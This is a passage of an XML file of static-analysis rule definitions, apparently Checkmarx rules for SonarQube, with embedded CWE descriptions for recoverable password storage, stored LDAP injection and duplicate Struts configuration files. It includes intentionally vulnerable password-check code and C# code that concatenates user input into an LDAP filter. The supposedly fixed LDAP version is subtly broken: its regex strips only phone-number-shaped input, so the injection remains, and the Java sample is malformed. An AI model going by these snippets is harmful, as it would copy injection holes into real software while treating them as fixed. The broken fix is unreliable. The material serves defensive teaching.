nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Potential Mitigations,
Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Description, Relationships, Observed Example,
Other Notes, Taxonomy Mappings&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Previous Entry Names&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Change Date&lt;/th&gt;&lt;th valign="top" nowrap="" colspan="3"&gt;Previous Entry
Name&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;2008-04-11&lt;/td&gt;&lt;td valign="top" colspan="3"&gt;Client-Side
Authentication&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td style="border-bottom:1px solid #BAC5E3" colspan="4"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1696</key><name>Storing_Passwords_in_a_Recoverable_Format</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Storing Passwords in a Recoverable Format&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;257&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Base)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Incomplete"&gt;Incomplete&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_257_Description" id="oc_257_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;The storage of passwords in a recoverable format makes them
subject to password reuse attacks by malicious users. If a system administrator
can recover a password directly, or use a brute force search on the available
information, the administrator can use the password on other
accounts.&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_257_Time of Introduction" id="oc_257_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Architecture and Design&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_257_Applicable Platforms" id="oc_257_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;All&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Common Consequences"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Common Consequences&lt;/div&gt;&lt;div name="oc_257_Common Consequences" id="oc_257_Common Consequences" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Scope&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Effect&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Confidentiality&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;User's passwords may be revealed.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Authentication&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;Revealed passwords may be reused elsewhere to impersonate the users in
question.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Likelihood of Exploit"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Likelihood of Exploit&lt;/div&gt;&lt;div name="oc_257_Likelihood of Exploit" id="oc_257_Likelihood of Exploit" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="indent"&gt;Very High&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Demonstrative Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Demonstrative Examples&lt;/div&gt;&lt;div name="oc_257_Demonstrative Examples" id="oc_257_Demonstrative Examples" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="subheading"&gt;Example 1&lt;/p&gt;&lt;p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example Languages: &lt;/span&gt;C and C++&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;int VerifyAdmin(char *password) {&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;if (strcmp(compress(password), compressed_password)) {&lt;/div&gt;
&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;printf("Incorrect Password!\n");&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;return(0);&lt;/div&gt;
&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;printf("Entering Diagnostic Mode...\n");&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;return(1);&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;Java&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;int VerifyAdmin(String password) {&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;if (passwd.Equals(compress(password), compressed_password))
{&lt;/div&gt;
&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;return(0);&lt;/div&gt;
&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;&lt;i&gt;//Diagnostic Mode&lt;/i&gt;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;return(1);&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_257_Potential Mitigations" id="oc_257_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Architecture and Design&lt;/p&gt;&lt;p&gt;Use strong, non-reversible encryption to protect stored
passwords.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Other Notes"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Other Notes&lt;/div&gt;&lt;div name="oc_257_Other Notes" id="oc_257_Other Notes" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;The use of recoverable passwords significantly increases the chance that
passwords will be used maliciously. In fact, it should be noted that
recoverable encrypted passwords provide no significant benefit over
plain-text passwords since they are subject not only to reuse by malicious
attackers but also by malicious insiders.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Weakness Ordinalities"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Weakness Ordinalities&lt;/div&gt;&lt;div name="oc_257_Weakness Ordinalities" id="oc_257_Weakness Ordinalities" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Ordinality&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Description&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Primary&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div style="font-size:90%; font-style:italic; padding:5px;"&gt;(where
the weakness exists independent of other weaknesses)&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_257_Relationships" id="oc_257_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;522&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=522" target="_blank"&gt;Insufficiently Protected Credentials&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;PeerOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;259&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=259" target="_blank"&gt;Use of Hard-coded Password&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;PeerOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;798&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=798" target="_blank"&gt;Use of Hard-coded Credentials&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Causal Nature"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt;&lt;a href="javascript:toggleblocksOC('257_Causal Nature');"&gt;f&lt;/a&gt; &lt;/span&gt;Causal Nature&lt;/div&gt;&lt;div name="oc_257_Causal Nature" id="oc_257_Causal Nature" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="indent"&gt;Explicit&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_257_Taxonomy Mappings" id="oc_257_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;CLASP&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Storing passwords in a recoverable format&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Related Attack Patterns"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Related Attack Patterns&lt;/div&gt;&lt;div name="oc_257_Related Attack Patterns" id="oc_257_Related Attack Patterns" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;CAPEC-ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Attack Pattern Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;&lt;div style="font-weight:normal; font-size:85%; font-style:italic; color:#000000"&gt;(CAPEC Version: 1.5)&lt;/div&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org49.html" target="_blank"&gt;49&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Password Brute Forcing&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Maintenance Notes"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Maintenance Notes&lt;/div&gt;&lt;div name="oc_257_Maintenance Notes" id="oc_257_Maintenance Notes" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;The meaning of this node needs to be investigated more closely, especially
with respect to what is meant by "recoverable."&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_257_Content History" id="oc_257_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Submissions&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Submission Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Submitter&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CLASP&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Externally Mined&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Common Consequences, Relationships, Other Notes,
Taxonomy Mappings, Weakness Ordinalities&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-10-14&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Demonstrative Examples, Description,
Maintenance Notes, Potential Mitigations&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2010-02-16&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1678</key><name>Stored_LDAP_Injection</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could arbitrarily engineer the application&amp;#8217;s LDAP queries. Depending on how the application is using LDAP, the attacker could potentially do any of the following:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Log in as another user&lt;/li&gt;
&lt;li&gt;Escalate privileges&lt;/li&gt;
&lt;li&gt;Steal information&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application communicates with an LDAP server, such as Active Directory, by sending a textual LDAP query or command. The application creates the query by simply concatenating strings including the user's input. Since the user input is neither checked for data type validity nor subsequently sanitized, the input could contain LDAP commands that would be interpreted as such by the LDAP server.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Validate all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;
The application uses the "user" field string from an HttpRequest to communicate with an LDAP server
      &lt;/h4&gt;&lt;pre&gt;

public class LDAPInjection
{
        public void foo(HttpRequest Request, DirectorySearcher searcher)
        {
                string userName = Request.QueryString["user"];
                searcher.Filter = "(&amp;(samAccountName=" + userName + "))";
        }
}



      &lt;/pre&gt;&lt;h4&gt;
Potentially hazardous characters in the "user" string are removed
      &lt;/h4&gt;&lt;pre&gt;

public class LDAPInjectionFixed
{
        public void foo(HttpRequest Request, DirectorySearcher searcher)
        {
                string userName = Request.QueryString["user"];
                userName = Regex.Replace(userName, "^\\d{3}-\\d{3}-\\d{4}$", "");
                searcher.Filter = "(&amp;(samAccountName=" + userName + "))";
        }
}





      &lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_658</key><name>Struts_Duplicate_Config_Files</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Use of Multiple Resources with Duplicate Identifier&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;694&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Base)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Incomplete"&gt;Incomplete&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_694_Description" id="oc_694_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;The product uses multiple resources that can have the same
identifier, in a context in which unique identifiers are required. This could
lead to operations on the wrong resource, or inconsistent
operations.&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_694_Time of Introduction" id="oc_694_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Architecture and Design&lt;/li&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_694_Applicable Platforms" id="oc_694_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;All&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_694_Potential Mitigations" id="oc_694_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;Use unique identifiers.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
